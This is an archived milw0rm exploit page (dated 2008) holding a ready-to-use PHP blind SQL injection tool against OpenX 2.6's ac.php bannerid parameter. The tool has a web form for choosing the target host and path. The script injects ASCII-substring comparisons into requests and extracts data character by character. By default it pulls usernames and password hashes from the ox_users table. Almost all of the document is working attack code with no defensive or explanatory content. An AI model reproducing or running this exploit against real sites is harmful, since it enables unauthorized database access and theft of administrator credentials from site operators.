<html><head><title>OpenX 2.6 (ac.php bannerid) Remote Blind SQL Injection Exploit</title></head><pre>&lt;html&gt;
&lt;head&gt;&lt;title&gt;OpenX Remote Blind SQL Injection Exploit By d00m3r4ng&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;center&gt;
&lt;?php
//discovered by d00m3r4ng
//exploit coded by d00m3r4ng
//contact: d00m3r4ng[at]gmail.com
set_time_limit(0);
function sockr($j, $exp, $asc){
extract ($_POST);
global $l;
if($socket = @fsockopen($host, 80,$e,$r,5)){
$inj=&quot;www/delivery/ac.php?bannerid=-1%20or%20ascii(substring((select%20$result%20from%20$table%20limit%20$l,1),$j,1))$exp&quot;.&quot;$asc&quot;;
$req=&quot;GET /$path/$inj HTTP/1.1 \r\nHost: $host\r\nConnection: Close\r\n\r\n&quot;;
fwrite($socket, $req);
while (!feof($socket)) $res.=fgets($socket,512);
fclose($socket);}
if(strstr($res,&quot;http://&quot;)) return true; else return false; }
function getLength(){
$i=1;
while(sockr($i,&quot;&gt;&quot;,0)) $i++;
return $i;
}
function getValue($length){
for ($a=1;$a&lt;$length;$a++){
$bl=45; $bh=123;
while(!sockr($a,&quot;=&quot;,$b=intval(($bl+$bh)/2)))
if (sockr($a,&quot;&gt;&quot;,$b)) $bl=$b;
else $bh=$b;
$v.=chr($b);}
return $v; }
$host=&quot;127.0.0.1&quot;;
$result=&quot;concat(username,0x3A,password)&quot;;
$table=&quot;ox_users&quot;;
if(isset($_POST['host'])){
extract($_POST);
$l=0;
while(sockr(1,&quot;&gt;&quot;,0)) $l++;
$f=$l;
for ($l=0;$l&lt;$f;$l++) 
if ($length=getLength())  echo &quot;VALUE: &quot;.getValue($length).&quot;&lt;br&gt;&quot;; }
?&gt;
&lt;b&gt;OpenX Remote Blind SQL Injection Exploit By d00m3r4ng&lt;br&gt;
Vuln discovered and Exploit coded by d00m3r4ng&lt;br&gt;Contact: d00m3r4ng[at]gmail.com&lt;/b&gt;
&lt;br&gt;&lt;br&gt;
&lt;form method=&quot;post&quot;&gt;
Host: &lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;&lt;?php echo $host ?&gt;&quot; size=&quot;70&quot;&gt;&lt;br&gt;
OpenX Path: /&lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;100&quot; value=&quot;&lt;?php echo $path ?&gt;&quot;&gt;&lt;br&gt;
SELECT  &lt;input type=&quot;text&quot; name=&quot;result&quot; size=&quot;50&quot; value=&quot;&lt;?php echo $result ?&gt;&quot;&gt;  FROM  &lt;input type=&quot;text&quot; name=&quot;table&quot; value=&quot;&lt;?php echo $table ?&gt;&quot;&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; value=&quot;Inject&quot;&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;

# milw0rm.com [2008-10-02]</pre></html>